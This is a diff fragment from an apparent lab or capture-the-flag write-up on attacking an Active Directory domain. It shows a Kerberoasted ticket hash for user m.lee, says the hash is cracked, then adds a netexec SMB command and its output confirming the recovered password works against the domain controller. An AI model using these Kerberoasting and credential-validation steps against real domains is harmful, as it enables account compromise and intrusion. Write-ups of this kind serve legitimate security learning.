@@ -569,5 +569,13 @@ $krb5tgs$23$*m.lee$NOVAFORGE.LOCAL$novaforge.local\m.lee*$6a4d27495c85698c8b4183
 
 Ill place only `m.lee` hash in a file, then it cracks!
 
+```python
+nxc smb dc.novaforge.local -u m.lee -p '0816mypassword' --smb-timeout 5                       
+SMB         10.0.0.100      445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:novaforge.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.0.100      445    DC               [+] novaforge.local\m.lee:0816mypassword
+```
+
+This user is now compromised!
+
 
 
